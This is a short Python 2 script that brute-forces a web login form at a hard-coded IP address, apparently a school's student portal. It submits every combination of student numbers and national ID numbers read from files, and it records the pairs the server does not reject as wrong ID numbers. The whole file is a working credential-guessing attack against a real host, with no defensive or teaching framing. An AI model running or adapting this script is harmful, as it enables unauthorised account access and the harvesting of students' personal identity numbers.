#coding=utf-8
import urllib2
import urllib
import httplib


if __name__ == '__main__':
    outFile=open('result.txt','w')
    with open('xh.txt','r') as fXh:
        with open('sfzh.txt','r') as fSfzh:
            for xh in fXh.readlines():
                for sfzh in fSfzh.readlines():
                    header={"Content-Type":"application/x-www-form-urlencoded",
                    "Connection":"keep-alive",
                    "Referer":"http://211.70.176.123/wap/"};
                    conn=httplib.HTTPConnection("211.70.176.123")
                    xh=xh.strip()
                    sfzh=sfzh.strip()
                    params=urllib.urlencode({'xh':xh,'sfzh':sfzh})
                    conn.request(method="POST",url="/wap/index.asp",body=params,headers=header)
                    responseText=conn.getresponse().read().decode('gb2312')
                    print sfzh
                    if not responseText.find(u'对不起，身份证号错误！') > 0:
                        print '----find xh:',xh,'with sfzh:',sfzh,'----'
                        outFile.write(xh+'    '+sfzh+'\n')
                fSfzh.seek(0)
    outFile.close()

#print "All thread OK,Maybe Not"
            
    
    
